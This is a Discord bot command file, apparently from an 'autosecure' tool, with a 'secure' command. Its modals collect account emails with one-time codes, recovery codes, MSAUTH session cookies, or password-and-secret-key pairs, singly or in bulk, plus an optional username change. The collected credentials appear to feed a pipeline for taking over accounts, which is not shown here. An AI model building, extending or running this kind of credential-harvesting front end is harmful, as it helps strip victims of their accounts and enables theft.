const { ApplicationCommandOptionType, TextInputStyle } = require("discord.js");
const modalBuilder = require("../../../autosecure/utils/modalBuilder");
const listConfiguration = require("../../../autosecure/utils/settings/listConfiguration");

module.exports = {
  name: "secure",
  description: "Secure one or multiple accounts",
  userOnly: true,
  enabled: true,

  options: [
    {
      name: "type",
      description: "How do you want to secure?",
      type: ApplicationCommandOptionType.String,
      required: true,
      choices: [
        { name: "OTP", value: "otp" },
        { name: "Recovery Code", value: "rec" },
        { name: "MSAUTH", value: "msauth" },
        { name: "Password + Secret Key", value: "zyger" },

        // 🔥 BULK (same logic as single)
        { name: "Bulk OTP", value: "bulk_otp" },
        { name: "Bulk Recovery", value: "bulk_rec" },
        { name: "Bulk Password + Secret Key", value: "bulk_zyger" },

        { name: "Secure Configuration", value: "config" }
      ]
    }
  ],

  callback: async (client, interaction) => {
    const option = interaction.options.getString("type");

    /* =========================
       SINGLE ACCOUNT MODALS
    ========================= */

    if (option === "otp") {
      return interaction.showModal(
        modalBuilder("otpsecure", "Secure via OTP", [
          {
            setCustomId: "email",
            setLabel: "Email",
            setPlaceholder: "test@outlook.com",
            setRequired: true,
            setStyle: TextInputStyle.Short
          },
          {
            setCustomId: "otp",
            setLabel: "OTP",
            setPlaceholder: "123456",
            setRequired: true,
            setStyle: TextInputStyle.Short
          },
          {
            setCustomId: "username",
            setLabel: "Change username (optional)",
            setRequired: false,
            setStyle: TextInputStyle.Short
          }
        ])
      );
    }

    if (option === "rec") {
      return interaction.showModal(
        modalBuilder("recsecure", "Secure via Recovery Code", [
          {
            setCustomId: "email",
            setLabel: "Email",
            setRequired: true,
            setStyle: TextInputStyle.Short
          },
          {
            setCustomId: "auth",
            setLabel: "Recovery Code",
            setRequired: true,
            setStyle: TextInputStyle.Short
          },
          {
            setCustomId: "username",
            setLabel: "Change username (optional)",
            setRequired: false,
            setStyle: TextInputStyle.Short
          }
        ])
      );
    }

    if (option === "msauth") {
      return interaction.showModal(
        modalBuilder("authsecure", "Secure via MSAUTH", [
          {
            setCustomId: "msauth",
            setLabel: "MSAUTH Cookie",
            setRequired: true,
            setStyle: TextInputStyle.Paragraph
          },
          {
            setCustomId: "username",
            setLabel: "Change username (optional)",
            setRequired: false,
            setStyle: TextInputStyle.Short
          }
        ])
      );
    }

    if (option === "zyger") {
      return interaction.showModal(
        modalBuilder("zygersecure", "Password + Secret Key", [
          {
            setCustomId: "email",
            setLabel: "Email",
            setRequired: true,
            setStyle: TextInputStyle.Short
          },
          {
            setCustomId: "pw",
            setLabel: "Password",
            setRequired: true,
            setStyle: TextInputStyle.Short
          },
          {
            setCustomId: "secretkey",
            setLabel: "Secret Key",
            setRequired: true,
            setStyle: TextInputStyle.Short
          },
          {
            setCustomId: "username",
            setLabel: "Change username (optional)",
            setRequired: false,
            setStyle: TextInputStyle.Short
          }
        ])
      );
    }

    /* =========================
       🔥 BULK (REAL SECURE)
       SAME PIPELINE AS SINGLE
    ========================= */

    if (option.startsWith("bulk_")) {
      return interaction.showModal(
        modalBuilder("bulk_secure", "Bulk Secure (max 7)", [
          {
            setCustomId: "bulkdata",
            setLabel: "Accounts (one per line)",
            setPlaceholder:
              "otp  → email:otp\nrec  → email:recovery\nzyger → email:password:secret",
            setRequired: true,
            setStyle: TextInputStyle.Paragraph
          }
        ])
      );
    }

    /* =========================
       CONFIG
    ========================= */

    if (option === "config") {
      return interaction.reply(
        await listConfiguration(interaction.user.id)
      );
    }
  }
};
